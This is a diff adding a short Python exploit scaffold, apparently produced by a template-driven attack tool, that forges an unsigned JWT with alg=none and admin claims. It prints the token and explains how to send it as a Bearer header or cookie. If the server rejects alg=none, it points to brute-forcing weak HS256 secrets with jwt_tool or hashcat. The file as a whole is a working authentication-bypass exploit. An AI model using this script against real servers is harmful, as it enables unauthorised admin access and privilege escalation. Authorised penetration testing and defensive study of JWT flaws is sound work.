@@ -1,0 +1,32 @@
+#!/usr/bin/env python3
+# wbx scaffold: JWT alg=none / weak verification  ({{LOCATION}})
+# Rule: {{RULE}}   Note: {{NOTE}}
+#
+# If the server accepts alg:none (or verifies with a guessable secret), forge an
+# admin token. This builds the none-alg token; for HS256 brute, see TODO.
+import base64
+import json
+
+
+def b64url(b: bytes) -> str:
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+
+def forge_none(claims: dict) -> str:
+    header = {"alg": "none", "typ": "JWT"}
+    h = b64url(json.dumps(header, separators=(",", ":")).encode())
+    p = b64url(json.dumps(claims, separators=(",", ":")).encode())
+    return f"{h}.{p}."   # empty signature
+
+
+def main():
+    # TODO: set the claims the app checks for privilege (role/admin/user id).
+    claims = {"user": "admin", "role": "admin"}
+    token = forge_none(claims)
+    print("forged (alg=none):", token)
+    print("\nSend as: Authorization: Bearer <token>  or the app's cookie/param.")
+    print("If alg:none is rejected, try HS256 with a weak/leaked secret (jwt_tool, hashcat -m 16500).")
+
+
+if __name__ == "__main__":
+    main()
